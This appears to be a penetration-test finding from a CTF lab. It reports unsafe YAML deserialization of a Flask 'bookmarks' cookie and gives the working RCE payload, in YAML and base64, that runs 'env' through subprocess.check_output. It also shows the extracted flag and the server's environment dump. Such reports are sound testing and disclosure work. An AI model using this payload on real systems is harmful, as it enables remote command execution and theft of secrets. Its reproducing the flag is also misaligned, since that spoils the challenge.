findings.title: Insecure YAML Deserialization in bookmarks Cookie (RCE)
findings.description: The Flask application stores a YAML-serialized list of bookmarks (Python objects using !!python/object:app.models.UrlObj tags) in the client-side 'bookmarks' cookie. The server deserializes this cookie using yaml.load() (unsafe loader), which supports arbitrary Python object instantiation. An attacker can craft a malicious YAML payload in the cookie that executes arbitrary OS commands via !!python/object/apply:subprocess.check_output or similar tags. The FLAG environment variable was extracted, confirming full RCE.
findings.evidence:
CTF FLAG extracted from server environment: FLAG=flag{ed791869-404b-453f-bf8e-86a09040af65}

Exploit cookie payload:
- name: !!python/object/apply:subprocess.check_output
    - [/bin/sh, -c, env]
  url: http://172.17.0.1:39995/

Base64: LSBuYW1lOiAhIXB5dGhvbi9vYmplY3QvYXBwbHk6c3VicHJvY2Vzcy5jaGVja19vdXRwdXQKICAgIC0gWy9iaW4vc2gsIC1jLCBlbnZdCiAgdXJsOiBodHRwOi8vMTcyLjE3LjAuMTozOTk5NS8K

Server environment dump revealed:
HOSTNAME=3f6e8d06cdce
FLAG=flag{ed791869-404b-453f-bf8e-86a09040af65}
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

findings.tool_used: manual YAML deserialization exploit via http_request

reproduction.expected: Response body contains env vars including FLAG=flag{ed791869-404b-453f-bf8e-86a09040af65}
